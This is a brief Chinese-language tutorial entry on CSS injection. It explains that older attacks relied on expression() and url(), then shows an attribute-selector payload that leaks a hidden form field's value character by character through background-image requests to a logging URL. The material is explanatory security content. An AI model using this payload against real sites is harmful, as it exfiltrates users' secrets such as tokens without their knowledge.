CSS 注入
================================

基本介绍
--------------------------------
CSS注入最早开始于利用CSS中的 ``expression()`` ``url()`` ``regex()`` 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。

CSS selectors
--------------------------------

::

    <style>
        #form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
        #form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
        #form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
        [...]
    </style>
    <form action="http://example.com" id="form2">
        <input type="text" id="secret" name="secret" value="abc">
    </form>


上图是利用CSS selectors完成攻击的一个示例

